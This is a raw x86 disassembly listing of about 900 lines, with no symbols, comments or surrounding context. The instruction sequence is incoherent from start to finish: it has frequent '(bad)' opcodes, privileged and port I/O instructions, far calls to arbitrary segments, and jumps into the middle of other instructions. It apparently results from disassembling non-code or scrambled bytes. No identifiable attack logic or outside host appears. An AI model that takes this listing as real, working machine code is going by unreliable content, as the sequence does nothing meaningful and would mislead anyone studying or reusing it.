  40403b:	mov    al,ds:0x92cf6a4d
  404040:	sbb    bh,BYTE PTR [edi+0x5e3e9fa]
  404046:	clc    
  404047:	pop    edi
  404048:	inc    ebp
  404049:	ja     0x403ffd
  40404b:	stc    
  40404c:	int3   
  40404d:	scas   al,BYTE PTR es:[edi]
  40404e:	xor    DWORD PTR [ecx+0x6831b835],esi
  404054:	cmp    ecx,ebx
  404056:	and    DWORD PTR [eax+0x40],esi
  404059:	dec    ebp
  40405a:	push   edx
  40405b:	and    al,0x73
  40405d:	fwait
  40405e:	dec    esi
  40405f:	je     0x4040e0
  404061:	sbb    BYTE PTR [ebp+0x37a06ca9],bh
  404067:	pop    DWORD PTR [esi-0x3acee077]
  40406d:	xchg   ebp,eax
  40406e:	push   ebp
  40406f:	jle    0x404024
  404071:	imul   ebp,DWORD PTR [eax+0x30],0xdc7db0eb
  404078:	pop    es
  404079:	and    DWORD PTR [ebx+0x4b],0xffffffc6
  40407d:	sbb    DWORD PTR [esi-0x375b36d0],0xa4ee9cf7
  404087:	xor    edx,edx
  404089:	fwait
  40408a:	das    
  40408b:	pop    ecx
  40408c:	hlt    
  40408d:	or     bh,dl
  40408f:	and    eax,0xae7c0007
  404094:	pop    esp
  404095:	jecxz  0x40401f
  404097:	xchg   esp,eax
  404098:	clc    
  404099:	sbb    al,0xa0
  40409b:	adc    eax,0x339ec32e
  4040a0:	retf   0xbc4d
  4040a3:	sub    BYTE PTR [ebx+0x79e0553a],0xdd
  4040aa:	(bad)  
  4040ab:	(bad)  
  4040ac:	cmp    eax,0x534008e
  4040b1:	pop    esi
  4040b2:	ret    0xc5b2
  4040b5:	inc    DWORD PTR [ebx-0x67]
  4040b8:	sahf   
  4040b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040ba:	pushf  
  4040bb:	sahf   
  4040bc:	cmc    
  4040bd:	sub    al,0x19
  4040bf:	pop    es
  4040c0:	cmp    al,0x3a
  4040c2:	lahf   
  4040c3:	out    dx,eax
  4040c4:	xchg   cl,ah
  4040c6:	lods   eax,DWORD PTR ds:[esi]
  4040c7:	push   eax
  4040c8:	fmul   QWORD PTR [ecx+0x1b]
  4040cb:	cmp    al,0x91
  4040cd:	fnstenv [edi-0x9b4b320]
  4040d3:	out    dx,eax
  4040d4:	xchg   edi,eax
  4040d5:	sbb    ch,BYTE PTR [ecx]
  4040d7:	xchg   ebp,eax
  4040d8:	jo     0x4040bc
  4040da:	repnz push ebp
  4040dc:	ret    
  4040dd:	xchg   DWORD PTR [ecx],ebx
  4040df:	repnz push ds
  4040e1:	fsubr  QWORD PTR [esi]
  4040e3:	dec    eax
  4040e4:	push   cs
  4040e5:	pop    ecx
  4040e6:	ret    0x56a
  4040e9:	and    eax,0x31662a4c
  4040ee:	daa    
  4040ef:	or     eax,0xdcaba310
  4040f4:	dec    edx
  4040f5:	out    dx,eax
  4040f6:	jb     0x4040dc
  4040f8:	lods   al,BYTE PTR ds:[esi]
  4040f9:	scas   eax,DWORD PTR es:[edi]
  4040fa:	mov    edx,0xbb5ddae4
  4040ff:	sub    esp,ecx
  404101:	or     DWORD PTR [edi],0xb4df5d33
  404107:	xchg   dl,ch
  404109:	xchg   esi,eax
  40410a:	lock sbb edx,0xfe6c6172
  404111:	push   ds
  404112:	out    0x31,al
  404114:	xor    BYTE PTR [edi+edx*1-0x7bcf0ca4],dh
  40411b:	stc    
  40411c:	or     eax,0x538e2c3d
  404121:	or     bh,cl
  404123:	inc    eax
  404124:	and    bh,bl
  404126:	push   ecx
  404127:	aad    0xc4
  404129:	test   al,0x4a
  40412b:	in     eax,0x2
  40412d:	jl     0x40412a
  40412f:	mov    cl,0xf1
  404131:	push   esi
  404132:	xor    al,0xcb
  404134:	dec    ebx
  404135:	(bad)
  404138:	adc    ebx,esp
  40413a:	xchg   esi,eax
  40413b:	cmpps  xmm4,XMMWORD PTR ds:[ebx-0x3c],0x91
  404141:	outs   dx,DWORD PTR ds:[esi]
  404142:	hlt    
  404143:	adc    eax,eax
  404145:	sub    BYTE PTR ds:0x5e49f6dd,ah
  40414b:	pop    esi
  40414c:	dec    esp
  40414d:	neg    DWORD PTR [ecx+0x260964bb]
  404153:	out    dx,eax
  404154:	add    al,0x77
  404156:	pop    edx
  404157:	rol    DWORD PTR [edx+0x34],0x63
  40415b:	push   ebx
  40415c:	jmp    0x8e8a3351
  404161:	(bad)
  404165:	dec    ecx
  404166:	addr16 push esi
  404168:	sar    DWORD PTR [esi],0x44
  40416b:	ds inc ecx
  40416d:	in     eax,dx
  40416e:	ins    BYTE PTR es:[edi],dx
  40416f:	sbb    ah,al
  404171:	xchg   edx,eax
  404172:	stos   BYTE PTR es:[edi],al
  404173:	es nop
  404175:	mov    esi,0x7805d64d
  40417a:	add    ah,BYTE PTR [eax-0x62c4c9f2]
  404180:	xchg   edi,eax
  404181:	xchg   edx,eax
  404182:	jae    0x404171
  404184:	mov    ah,0x22
  404186:	add    eax,0x60aaefbd
  40418b:	test   eax,0x72f3fd8b
  404190:	stos   DWORD PTR es:[edi],eax
  404191:	sub    eax,eax
  404193:	xchg   edx,eax
  404194:	mov    BYTE PTR [edx],ch
  404196:	mov    al,0xa1
  404198:	or     esp,0x59
  40419b:	and    al,0x99
  40419d:	push   ds
  40419e:	int    0xda
  4041a0:	push   ebp
  4041a1:	lods   eax,DWORD PTR ds:[esi]
  4041a2:	ficom  DWORD PTR [edx]
  4041a4:	loopne 0x40417b
  4041a6:	add    ebx,DWORD PTR [ecx]
  4041a8:	inc    edx
  4041a9:	pinsrw mm6,WORD PTR [ecx-0x62],0xb6
  4041ae:	not    BYTE PTR [ebx+0x50]
  4041b1:	xor    al,0xee
  4041b3:	cli    
  4041b4:	shr    al,0x0
  4041b7:	add    edi,ecx
  4041b9:	xchg   ebp,eax
  4041ba:	dec    esi
  4041bb:	fs add al,0x2f
  4041be:	mov    edx,0x9062f03b
  4041c3:	or     eax,0x8550ab64
  4041c8:	(bad)  
  4041c9:	xchg   edi,eax
  4041ca:	mov    ecx,0x5479cf30
  4041cf:	sbb    ecx,ebx
  4041d1:	cmp    ch,BYTE PTR [edx]
  4041d3:	dec    eax
  4041d4:	pop    edx
  4041d5:	sti    
  4041d6:	mov    ds:0x42f0f8dc,eax
  4041db:	jge    0x404220
  4041dd:	push   ebp
  4041de:	sub    cl,BYTE PTR [edi+ebp*2+0x1da31b6]
  4041e5:	sub    al,BYTE PTR [esi+0x66]
  4041e8:	jbe    0x40420d
  4041ea:	jae    0x404224
  4041ec:	ja     0x404179
  4041ee:	and    BYTE PTR [ebx],bh
  4041f0:	hlt    
  4041f1:	aaa    
  4041f2:	rcl    eax,1
  4041f4:	adc    eax,0x2ece9453
  4041f9:	das    
  4041fa:	(bad)  
  4041fb:	es jb  0x404255
  4041fe:	icebp  
  4041ff:	sbb    BYTE PTR [ebx+ebp*4],dh
  404202:	lea    ebp,[esp+edi*4+0x7e]
  404206:	arpl   bp,cx
  404208:	jle    0x40421c
  40420a:	int3   
  40420b:	mov    ds:0x93f91257,al
  404210:	dec    esi
  404211:	aaa    
  404212:	mov    al,0x8d
  404214:	mov    al,BYTE PTR [edx]
  404216:	jg     0x40423b
  404218:	xor    eax,0x3aef770d
  40421d:	or     dl,BYTE PTR [ebx-0x28abeaf2]
  404223:	stc    
  404224:	mov    cs,esi
  404226:	mov    ds:0xf632219c,al
  40422b:	jp     0x4041ce
  40422d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40422e:	mov    ah,0xdb
  404230:	xchg   ebp,eax
  404231:	add    DWORD PTR [ebx-0x4b349212],eax
  404237:	xor    BYTE PTR [ebx-0x36],0xa3
  40423b:	ds icebp 
  40423d:	xchg   ebp,eax
  40423e:	mov    esp,0xcba3ab32
  404243:	sahf   
  404244:	pop    edx
  404245:	ror    DWORD PTR [ebp-0x77],0x1a
  404249:	lods   eax,DWORD PTR ds:[esi]
  40424a:	dec    ebp
  40424b:	pop    ss
  40424c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40424d:	bound  edx,QWORD PTR [ecx+0x6376c400]
  404253:	and    ch,0x6
  404256:	call   0x5948:0x4fefc4f
  40425d:	mov    ch,BYTE PTR [eax-0x5fa70c4e]
  404263:	jo     0x404212
  404265:	add    BYTE PTR [eax],bl
  404267:	mov    ds:0xf188ac58,al
  40426c:	(bad)  [ebx-0x13]
  40426f:	neg    BYTE PTR [edi]
  404271:	mov    bl,0xec
  404273:	data16 loope 0x4042a5
  404276:	shl    BYTE PTR [ebp-0x57],cl
  404279:	mov    eax,ds:0x107770c0
  40427e:	div    DWORD PTR [ebx]
  404280:	inc    ebx
  404281:	not    DWORD PTR [ebx+0x642d4330]
  404287:	test   al,0xe1
  404289:	rcr    DWORD PTR [edx],cl
  40428b:	aad    0xca
  40428d:	mov    BYTE PTR [eax+0x5c],ch
  404290:	add    ecx,DWORD PTR [ebp-0x73]
  404293:	sbb    bh,BYTE PTR [ebp-0x4b]
  404296:	imul   esp,edi,0xc9094597
  40429c:	scas   eax,DWORD PTR es:[edi]
  40429d:	pop    ds
  40429e:	ficomp WORD PTR [ecx]
  4042a0:	xchg   DWORD PTR [ecx+ecx*8-0x76],esp
  4042a4:	inc    esp
  4042a5:	fcomp  DWORD PTR [ebx+0x1bc81daf]
  4042ab:	fiadd  DWORD PTR [ebx]
  4042ad:	imul   eax,DWORD PTR [edx+0xbed8b19],0x46e80b54
  4042b7:	call   0x4775:0xf22eaa21
  4042be:	stos   BYTE PTR es:[edi],al
  4042bf:	sbb    ebp,DWORD PTR [edi+edi*8+0x6d]
  4042c3:	imul   esp,ebx,0x23fd0d68
  4042c9:	hlt    
  4042ca:	in     eax,0x63
  4042cc:	xchg   ecx,eax
  4042cd:	sti    
  4042ce:	pusha  
  4042cf:	sar    DWORD PTR [edx],1
  4042d1:	imul   ebp,DWORD PTR gs:[ecx-0x32],0xf3c48d74
  4042d9:	adc    cl,BYTE PTR [ebx-0x4b]
  4042dc:	dec    ebp
  4042dd:	rcl    edx,1
  4042df:	dec    edi
  4042e0:	pop    eax
  4042e1:	xchg   ebp,eax
  4042e2:	fcomp  QWORD PTR [eax]
  4042e4:	cmp    al,BYTE PTR [edi]
  4042e6:	lahf   
  4042e7:	mov    ebx,DWORD PTR [eax+0x6deb94cd]
  4042ed:	imul   ebx,ebx,0x48
  4042f0:	pusha  
  4042f1:	mov    ds:0xb08b678f,eax
  4042f6:	and    DWORD PTR [ebx-0x34],esp
  4042f9:	ret    
  4042fa:	rcr    BYTE PTR [ecx+eiz*8+0x7b],1
  4042fe:	fwait
  4042ff:	add    ecx,DWORD PTR [edi+0x5d]
  404302:	and    edi,DWORD PTR [edi-0x32]
  404305:	pop    eax
  404306:	mov    WORD PTR [edi+ecx*8],?
  404309:	lds    ebp,FWORD PTR [ebx+esi*2+0x6d]
  40430d:	pause  
  40430f:	call   0xf818:0xa425d2bc
  404316:	(bad)  
  404317:	adc    eax,0x7ae6afbf
  40431c:	sub    al,0xe3
  40431e:	inc    esi
  40431f:	pop    esp
  404320:	sbb    edx,DWORD PTR [ecx+0x5b56b39e]
  404326:	jae    0x4042fe
  404328:	push   ss
  404329:	fmul   st,st(0)
  40432b:	sti    
  40432c:	pop    ebp
  40432d:	or     ah,bh
  40432f:	lock sahf 
  404331:	sub    bh,cl
  404333:	push   0x4c
  404335:	dec    esp
  404336:	enter  0x9c9b,0xa2
  40433a:	and    ecx,DWORD PTR [esi+0x418fb111]
  404340:	arpl   WORD PTR [ebx-0x2a67c50b],cx
  404346:	dec    edi
  404347:	push   cs
  404348:	lds    ebp,FWORD PTR [edi*1+0x4457e424]
  40434f:	xor    al,0x25
  404351:	sub    DWORD PTR [ebx+0x2d],esi
  404354:	pusha  
  404355:	xor    BYTE PTR [edi+ebp*2+0x5fa36200],bl
  40435c:	push   edi
  40435d:	mov    edi,0x5d902c11
  404362:	and    edx,DWORD PTR [ecx-0x76889113]
  404368:	popa   
  404369:	add    al,0xb3
  40436b:	push   eax
  40436c:	push   es
  40436d:	pushf  
  40436e:	call   0x315c10ea
  404373:	fwait
  404374:	mov    es,WORD PTR [edi+0x8655adb]
  40437a:	push   0xc39d3356
  40437f:	xchg   BYTE PTR [esi-0x722421cf],ch
  404385:	xlat   BYTE PTR es:[ebx]
  404387:	cli    
  404388:	push   esi
  404389:	push   ebp
  40438a:	jp     0x40434b
  40438c:	jp     0x40436b
  40438e:	adc    ecx,DWORD PTR [ebx+eax*2-0x55]
  404392:	dec    esi
  404393:	cmp    BYTE PTR [eax+eiz*1-0x15],cl
  404397:	das    
  404398:	sar    DWORD PTR [esi-0x34],1
  40439b:	add    bl,BYTE PTR [edi+0x44]
  40439e:	inc    edi
  40439f:	pop    esi
  4043a0:	inc    ebx
  4043a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043a2:	pop    ss
  4043a3:	cmp    al,0xf5
  4043a5:	mov    al,ds:0xd7233868
  4043aa:	rol    BYTE PTR [esi+0x5c],cl
  4043ad:	test   eax,0x218ddd4b
  4043b2:	fisubr DWORD PTR [ebp-0x79]
  4043b5:	sub    al,0x7c
  4043b7:	mov    bl,0xb2
  4043b9:	js     0x40442d
  4043bb:	xor    eax,0x3616c9ab
  4043c0:	leave  
  4043c1:	mov    edx,0xb291533d
  4043c6:	adc    ah,0x4d
  4043c9:	push   edx
  4043ca:	fidivr WORD PTR [eax]
  4043cc:	(bad)  
  4043cd:	sub    al,0x71
  4043cf:	(bad)  
  4043d0:	out    0x65,al
  4043d2:	xchg   esi,eax
  4043d3:	add    eax,DWORD PTR [edi+0x74ea154]
  4043d9:	rcl    BYTE PTR [ecx-0x2cb8330],cl
  4043df:	in     al,0xab
  4043e1:	mov    ebx,?
  4043e3:	aaa    
  4043e4:	int3   
  4043e5:	adc    eax,0x870c12c2
  4043ea:	jmp    0x404466
  4043ec:	or     dl,dh
  4043ee:	ins    BYTE PTR es:[edi],dx
  4043ef:	(bad)  
  4043f0:	adc    BYTE PTR [edx+edx*8-0x46],ah
  4043f4:	mov    ds:0xa23c2bf3,eax
  4043f9:	adc    edx,0xffffffbb
  4043fc:	retf   0xfd8b
  4043ff:	xor    esp,DWORD PTR ds:0xfe4e7ad7
  404405:	pop    eax
  404406:	jb     0x404389
  404408:	add    al,0x4b
  40440a:	iret   
  40440b:	rcr    DWORD PTR [ecx+0xc85351d],1
  404411:	cmp    al,0x6b
  404413:	(bad)  
  404414:	lahf   
  404415:	inc    ecx
  404416:	rcl    DWORD PTR [edi-0x69cee8c3],0x44
  40441d:	clc    
  40441e:	pop    ecx
  40441f:	ins    DWORD PTR es:[edi],dx
  404420:	iret   
  404421:	mov    bh,ah
  404423:	sahf   
  404424:	adc    eax,0xf31adac2
  404429:	sbb    bl,al
  40442b:	lods   eax,DWORD PTR ds:[esi]
  40442c:	and    ch,ch
  40442e:	dec    ebp
  40442f:	mov    eax,ds:0xd9ab6936
  404434:	sub    BYTE PTR [eax],bl
  404436:	in     al,dx
  404437:	add    dh,BYTE PTR [ecx]
  404439:	mov    edi,0x97baa3e6
  40443e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40443f:	fidivr DWORD PTR [edx-0x75a8ac7a]
  404445:	jnp    0x40444c
  404447:	cmp    BYTE PTR [edi],0x55
  40444a:	sbb    DWORD PTR [edx+0xc],0xffffff91
  40444e:	into   
  40444f:	sbb    ecx,0x94e3cde9
  404455:	xor    al,0x58
  404457:	jmp    0x5b5e:0xb680ec68
  40445e:	ins    DWORD PTR es:[edi],dx
  40445f:	xchg   DWORD PTR ds:0xf1ac9dda,edx
  404465:	shl    ebp,cl
  404467:	mov    edi,0xe84b7219
  40446c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40446d:	leave  
  40446e:	mov    DWORD PTR [edx-0x3f],eax
  404471:	add    DWORD PTR [ebx-0x2],esi
  404474:	xchg   ecx,eax
  404475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404476:	mov    dl,0xbf
  404478:	sbb    al,0xdc
  40447a:	cmp    eax,0x8b9b18fe
  40447f:	sub    BYTE PTR [ebx-0x11],dh
  404482:	jge    0x40447f
  404484:	pop    ebx
  404485:	dec    ebx
  404486:	cmp    dl,BYTE PTR [edx+0x78c0bc15]
  40448c:	mov    DWORD PTR [ebp-0x18],ebp
  40448f:	fidiv  DWORD PTR [eax+edi*2+0x7e]
  404493:	push   eax
  404494:	ins    BYTE PTR es:[edi],dx
  404495:	sub    ebp,edi
  404497:	jl     0x40445d
  404499:	xchg   edx,eax
  40449a:	push   0x80d705e4
  40449f:	imul   ebp,DWORD PTR [edi-0x70],0xc1eb80d7
  4044a6:	and    cl,ch
  4044a8:	cmc    
  4044a9:	std    
  4044aa:	push   esi
  4044ab:	push   ebx
  4044ac:	dec    edx
  4044ad:	mov    ecx,gs
  4044af:	icebp  
  4044b0:	popf   
  4044b1:	jl     0x404479
  4044b3:	leave  
  4044b4:	and    BYTE PTR ds:0xe9c3ba4,ch
  4044ba:	mov    edi,0x2833decb
  4044bf:	xlat   BYTE PTR ds:[ebx]
  4044c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044c1:	push   ecx
  4044c2:	and    dl,0xf9
  4044c5:	fdivr  DWORD PTR [ebp+eiz*2+0xe]
  4044c9:	lock loop 0x404533
  4044cc:	js     0x4044c9
  4044ce:	stc    
  4044cf:	std    
  4044d0:	popa   
  4044d1:	das    
  4044d2:	outs   dx,DWORD PTR ds:[esi]
  4044d3:	in     eax,dx
  4044d4:	xlat   BYTE PTR ds:[ebx]
  4044d5:	xor    eax,0xd4dec04c
  4044da:	mov    dh,0xc1
  4044dc:	call   0xfe3c0afe
  4044e1:	test   BYTE PTR [edx+ebx*1],ah
  4044e4:	mov    ds:0x7398178b,al
  4044e9:	aas    
  4044ea:	outs   dx,DWORD PTR ds:[esi]
  4044eb:	pop    esi
  4044ec:	jle    0x404504
  4044ee:	push   eax
  4044ef:	lods   al,BYTE PTR ds:[esi]
  4044f0:	pop    ebx
  4044f1:	inc    ecx
  4044f2:	repnz push ss
  4044f4:	sar    esp,0xdc
  4044f7:	nop
  4044f8:	je     0x404543
  4044fa:	rcl    BYTE PTR [ecx],cl
  4044fc:	xchg   DWORD PTR ds:0xd9f32e,edi
  404502:	popf   
  404503:	add    dl,ch
  404505:	xlat   BYTE PTR ds:[ebx]
  404506:	ins    BYTE PTR es:[edi],dx
  404507:	lock clc 
  404509:	jmp    0x404566
  40450b:	sbb    eax,0x5c560931
  404510:	inc    esi
  404511:	stos   DWORD PTR es:[edi],eax
  404512:	cmp    BYTE PTR [edx+ebp*1+0x7d],bh
  404516:	cmp    dh,bl
  404518:	ret    
  404519:	sbb    ch,dl
  40451b:	xor    BYTE PTR [eax+0x7],dh
  40451e:	adc    DWORD PTR ds:0x3bfeeba6,ebp
  404524:	mov    ebp,DWORD PTR [edx+eax*2-0x9]
  404528:	imul   esp,DWORD PTR [esi+ebx*8+0x2e86f6a5],0x1edb4770
  404533:	fstp   DWORD PTR [ebp+esi*1+0x17589631]
  40453a:	jo     0x404588
  40453c:	mov    dh,0xfc
  40453e:	add    BYTE PTR [edx-0x77],dl
  404541:	ja     0x4044e0
  404543:	mov    edi,0x1a67c487
  404548:	jns    0x40451a
  40454a:	mov    dl,0x16
  40454c:	stos   DWORD PTR es:[edi],eax
  40454d:	out    dx,eax
  40454e:	iret   
  40454f:	bound  eax,QWORD PTR [ecx]
  404551:	jmp    0x565a63cf
  404556:	cmp    ecx,ecx
  404558:	iret   
  404559:	outs   dx,BYTE PTR ds:[esi]
  40455a:	retf   0x5da5
  40455d:	int    0xfe
  40455f:	sub    edi,DWORD PTR [edx+eiz*1-0x47]
  404563:	add    esi,DWORD PTR ds:0x23e0f33c
  404569:	in     eax,0xc1
  40456b:	push   edi
  40456c:	retf   
  40456d:	mov    al,0x9b
  40456f:	pop    ebx
  404570:	ds dec esi
  404572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404573:	mov    esp,edi
  404575:	jp     0x404598
  404577:	(bad)  
  404578:	cmc    
  404579:	jl     0x404597
  40457b:	sub    DWORD PTR [ebp+edi*1-0x51],0x41
  404580:	outs   dx,BYTE PTR ds:[esi]
  404581:	pop    ebx
  404582:	xor    eax,0xf220a258
  404587:	clts   
  404589:	cmp    bh,BYTE PTR [ebx-0x72]
  40458c:	(bad)  
  40458d:	gs dec eax
  40458f:	xchg   eax,ecx
  404591:	and    dh,BYTE PTR [ebx+0x55]
  404594:	pop    ds
  404595:	sbb    al,0xe1
  404597:	add    ecx,DWORD PTR [edx-0x77]
  40459a:	fistp  QWORD PTR [edx]
  40459c:	adc    al,0xa8
  40459e:	call   0x5a8f65cb
  4045a3:	call   0x7235:0x530a70e5
  4045aa:	out    0x9d,eax
  4045ac:	outs   dx,DWORD PTR ds:[esi]
  4045ad:	xor    DWORD PTR [esi-0x13],ecx
  4045b0:	or     ah,BYTE PTR [edx+0x30]
  4045b3:	ja     0x404541
  4045b5:	hlt    
  4045b6:	loope  0x40459c
  4045b8:	es popf 
  4045ba:	popa   
  4045bb:	xor    BYTE PTR [ebx],dl
  4045bd:	fcmove st,st(1)
  4045bf:	fistp  DWORD PTR [edi+0x65]
  4045c2:	inc    edi
  4045c3:	adc    ebx,DWORD PTR [ecx+edx*1]
  4045c6:	in     al,0xfb
  4045c8:	stc    
  4045c9:	mov    al,0x6a
  4045cb:	push   ecx
  4045cc:	sahf   
  4045cd:	ret    
  4045ce:	dec    ecx
  4045cf:	push   cs
  4045d0:	pop    eax
  4045d1:	outs   dx,BYTE PTR ds:[esi]
  4045d2:	add    eax,0x968bef8c
  4045d7:	push   cs
  4045d8:	jb     0x40456e
  4045da:	es pushf 
  4045dc:	dec    edx
  4045dd:	mov    ds:0x9795944d,al
  4045e2:	or     cl,cl
  4045e4:	jl     0x404600
  4045e6:	loope  0x404597
  4045e8:	jmp    0x40459f
  4045ea:	xlat   BYTE PTR ds:[ebx]
  4045eb:	fsubrp st(5),st
  4045ed:	sbb    ch,BYTE PTR [edx+0x14]
  4045f0:	xchg   DWORD PTR [edi+eiz*1-0x62],ecx
  4045f4:	or     dl,bl
  4045f6:	popf   
  4045f7:	sub    al,0x33
  4045f9:	imul   esi,esi,0x28
  4045fc:	cmc    
  4045fd:	push   ecx
  4045fe:	add    bh,bh
  404600:	adc    ebx,DWORD PTR [edx+0x1c19a857]
  404606:	xlat   BYTE PTR ds:[ebx]
  404607:	and    DWORD PTR [esi],edx
  404609:	test   al,0x4d
  40460b:	mov    ch,0xba
  40460d:	out    0x4f,eax
  40460f:	daa    
  404610:	inc    edx
  404611:	mov    ds:0x65fff915,eax
  404616:	jmp    0xfdbf:0x4f5b5ed
  40461d:	sbb    esi,ebx
  40461f:	or     DWORD PTR [ebx+0x21b521c8],eax
  404625:	lock out dx,eax
  404627:	bound  ebp,QWORD PTR [ecx]
  404629:	out    dx,eax
  40462a:	das    
  40462b:	ins    DWORD PTR es:[edi],dx
  40462c:	xor    al,BYTE PTR [ecx+0x410645a5]
  404632:	rcr    BYTE PTR [ecx+0x1d],1
  404635:	inc    ebp
  404636:	sbb    DWORD PTR [ecx+eax*2],edi
  404639:	inc    edx
  40463a:	sub    BYTE PTR [esi+eax*4-0x4d873082],bl
  404641:	je     0x40464d
  404643:	mov    ds:0xf1284e9a,al
  404648:	shr    ch,1
  40464a:	mov    edi,0x356e9d08
  40464f:	popf   
  404650:	iret   
  404651:	sbb    eax,0xa30a3509
  404656:	or     esp,DWORD PTR ds:0x1bacfc68
  40465c:	cmp    al,ch
  40465e:	sub    eax,0x79d05ae1
  404663:	xchg   edi,eax
  404664:	(bad)  
  404665:	xor    ebp,DWORD PTR [esp+ebx*2-0x740101d1]
  40466c:	stos   DWORD PTR es:[edi],eax
  40466d:	inc    esp
  40466e:	loop   0x4046e9
  404670:	add    eax,0x4bd27803
  404675:	sub    eax,DWORD PTR [ebx+0x2b5430c0]
  40467b:	popa   
  40467c:	mov    ebx,0xa6b1b8e8
  404681:	imul   esi,edx,0x2e26a13c
  404687:	test   bh,al
  404689:	ss and al,0x43
  40468c:	cdq    
  40468d:	cld    
  40468e:	fwait
  40468f:	xchg   esi,eax
  404690:	pop    esp
  404691:	out    0xaa,al
  404693:	mov    ebx,0xe18d7cc8
  404698:	je     0x40468c
  40469a:	icebp  
  40469b:	mov    cl,0x69
  40469d:	pop    esp
  40469e:	mov    ecx,0x2d2fcc01
  4046a3:	jmp    0x2fc3:0xe8df08c4
  4046aa:	lahf   
  4046ab:	adc    al,0x30
  4046ad:	inc    esi
  4046ae:	popa   
  4046af:	sar    bh,0x56
  4046b2:	adc    ch,BYTE PTR [edx-0x27]
  4046b5:	xchg   BYTE PTR [ebx],ah
  4046b7:	sub    al,0x61
  4046b9:	shl    BYTE PTR [ebp-0x53ea290e],0x8a
  4046c0:	aad    0xaa
  4046c2:	and    edi,edx
  4046c4:	in     al,0x23
  4046c6:	mov    edx,0xe38a2e23
  4046cb:	ss and eax,0x6b10b7f5
  4046d1:	out    dx,eax
  4046d2:	or     dl,bl
  4046d4:	icebp  
  4046d5:	stc    
  4046d6:	int3   
  4046d7:	inc    esi
  4046d8:	sbb    DWORD PTR [eax-0x66],edx
  4046db:	(bad)  
  4046dc:	sub    BYTE PTR [ebp-0x5d578323],bl
  4046e2:	shr    BYTE PTR es:[ebx-0x1e],1
  4046e6:	cmp    bl,BYTE PTR [esi-0x5d]
  4046e9:	cwde   
  4046ea:	xor    DWORD PTR [esi],edx
  4046ec:	mov    al,ds:0x107070d1
  4046f1:	fist   WORD PTR [ecx+0x1bf12386]
  4046f7:	fidiv  WORD PTR [edi+0x6880d164]
  4046fd:	cmp    ah,ch
  4046ff:	stc    
  404700:	fwait
  404701:	call   0xfdd7:0xfd641c4
  404708:	int3   
  404709:	dec    ebp
  40470a:	cmp    al,0x75
  40470c:	imul   ebp,DWORD PTR [edx+0x7182e17e],0x1400ffcf
  404716:	add    al,0xa7
  404718:	ds scas al,BYTE PTR es:[edi]
  40471a:	int    0xce
  40471c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40471d:	shl    BYTE PTR [ecx-0x7d830ec1],0xc
  404724:	add    DWORD PTR [ecx+0x19cbd957],0x9
  40472b:	call   0x35aecf9a
  404730:	sub    al,BYTE PTR [edi]
  404732:	adc    esp,edx
  404734:	sar    DWORD PTR [ecx+esi*4-0x29],cl
  404738:	mov    al,ds:0x92fc8dd
  40473d:	or     BYTE PTR [ebx-0x6e],dl
  404740:	dec    edx
  404741:	inc    ecx
  404742:	and    al,0x83
  404744:	cs sub al,0x47
  404747:	out    dx,eax
  404748:	sub    eax,0x1276afbb
  40474d:	xchg   esp,eax
  40474e:	in     al,dx
  40474f:	out    0x5c,eax
  404751:	icebp  
  404752:	adc    DWORD PTR [edx],esi
  404754:	cdq    
  404755:	sub    ch,dl
  404757:	jecxz  0x4047cd
  404759:	lods   eax,DWORD PTR ds:[esi]
  40475a:	test   DWORD PTR [esp+ebx*2],esi
  40475d:	dec    edi
  40475e:	mov    ds:0xe24e6e53,al
  404763:	cs addr16 ffree st(1)
  404767:	push   ebx
  404768:	int3   
  404769:	jecxz  0x40477a
  40476b:	fwait
  40476c:	(bad)  
  40476d:	xor    eax,0xb167fd3c
  404772:	imul   ebx,DWORD PTR [esi+0x6dcc1205],0xfa5b5ca4
  40477c:	(bad)  
  40477d:	stos   DWORD PTR es:[edi],eax
  40477e:	sti    
  40477f:	call   0xcb9c:0xa8262512
  404786:	xor    BYTE PTR [ebx-0x36b1d45c],ch
  40478c:	or     al,0x58
  40478e:	mov    ebp,0xa4c94ae5
  404793:	xor    BYTE PTR [ebp+0xf],ah
  404796:	push   esi
  404797:	push   eax
  404798:	jge    0x404751
  40479a:	and    al,0xfc
  40479c:	out    0xe9,eax
  40479e:	sbb    eax,0xc0da5bbe
  4047a3:	lahf   
  4047a4:	inc    esp
  4047a5:	inc    edx
  4047a6:	sub    ah,ah
  4047a8:	(bad)  
  4047a9:	sbb    eax,0x70465ef
  4047ae:	stos   DWORD PTR es:[edi],eax
  4047af:	and    BYTE PTR [edx],bh
  4047b1:	(bad)  
  4047b2:	sbb    esp,ebx
  4047b4:	xor    ecx,ebx
  4047b6:	out    0xa7,al
  4047b8:	clc    
  4047b9:	jns    0x40478b
  4047bb:	mov    ds:0xf0748827,al
  4047c0:	lods   al,BYTE PTR ds:[esi]
  4047c1:	sub    DWORD PTR [edi],0xe3629e3d
  4047c7:	or     BYTE PTR [esi],bl
  4047c9:	pop    ds
  4047ca:	pop    ss
  4047cb:	mov    esp,0xcf422317
  4047d0:	stos   BYTE PTR es:[edi],al
  4047d1:	pop    DWORD PTR [eax]
  4047d3:	test   al,ch
  4047d5:	ins    BYTE PTR es:[edi],dx
  4047d6:	mov    ah,BYTE PTR [eax]
  4047d8:	out    0x84,al
  4047da:	inc    esp
  4047db:	push   esi
  4047dc:	cmp    eax,0x1e2813fd
  4047e1:	sub    eax,0x17c3611a
  4047e6:	xchg   edx,eax
  4047e7:	loop   0x404771
  4047e9:	call   0x4457:0xcbb351d3
  4047f0:	and    BYTE PTR [ecx+0x62],dh
  4047f3:	and    bh,BYTE PTR [eax]
  4047f5:	push   0x3675c32c
  4047fa:	dec    edx
  4047fb:	hlt    
  4047fc:	rcl    BYTE PTR [ebx+0x6f],1
  4047ff:	out    0xa1,eax
  404801:	sub    ch,bh
  404803:	jnp    0x404820
  404805:	dec    esp
  404806:	adc    edi,ecx
  404808:	fcmovnu st,st(4)
  40480a:	fst    QWORD PTR [ebp-0x26c94635]
  404810:	pop    ebx
  404811:	jnp    0x404879
